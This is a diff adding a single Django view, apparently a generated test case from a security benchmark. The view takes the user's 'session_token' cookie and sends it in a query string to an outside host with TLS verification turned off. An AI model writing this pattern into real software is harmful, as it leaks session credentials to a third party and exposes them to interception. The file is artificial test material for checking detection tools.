@@ -1,0 +1,16 @@
+# SPDX-License-Identifier: Apache-2.0
+from django.http import JsonResponse
+import requests
+
+
+def BenchmarkTest74967(request):
+    cookie_value = request.COOKIES.get('session_token', '')
+    kind = 'json' if str(cookie_value).lstrip().startswith('{') else 'text'
+    match kind:
+        case 'json':
+            parsed = cookie_value
+            data = parsed
+        case _:
+            data = cookie_value
+    requests.get('https://api.pycdn.io/data', params={'q': str(data)}, verify=False)
+    return JsonResponse({"saved": True})
